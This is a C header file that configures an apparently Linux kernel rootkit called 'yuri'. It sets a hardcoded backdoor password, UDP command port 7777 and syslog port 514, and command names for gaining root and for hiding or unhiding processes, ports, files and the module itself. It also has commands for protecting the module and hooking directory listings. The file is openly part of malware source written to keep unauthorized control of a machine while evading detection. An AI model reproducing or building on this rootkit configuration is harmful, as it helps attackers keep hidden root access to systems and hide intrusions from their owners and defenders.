#ifndef CONFIG_H
#define CONFIG_H

#define MODULE_NAME_ "yuri"

#define CFG_ROOTKIT_NAME "yuri"
#define CFG_PASS "sixsixsix666"

// 以下开始定义各功能名
#define CFG_ROOT "root"
#define CFG_HIDE "hide"
#define CFG_UNHIDE "unhide"
#define CFG_PROTECT "protect"
#define CFG_UNPROTECT "unprotect"
#define CFG_LSHOOK "lshook"
#define CFG_CLEANLSHOOK "cleanlshook"
#define CFG_HIDE_PORT "hideport"
#define CFG_UNHIDE_PORT "unhideport"
#define CFG_HIDE_FILE "hidefile"
#define CFG_UNHIDE_FILE "unhidefile"
#define CFG_HIDE_PID "hidepid"
#define CFG_UNHIDE_PID "unhidepid"

/* ip lengths */
#define IPV4_LENGTH 4
#define IPV6_LENGTH 16

/* udp settings */
#define UDP_PORT 7777
#define SYS_PORT 514
#define UDP_BUFF 128

/* command settings */
#define PID_MAX_DIGIT 8
#define SOC_MAX_DIGIT 8
#define PR0TCL_LENGTH 4
#define LOPORT_LENGTH 5
#define IP_MAX_LENGTH INET6_ADDRSTRLEN

#endif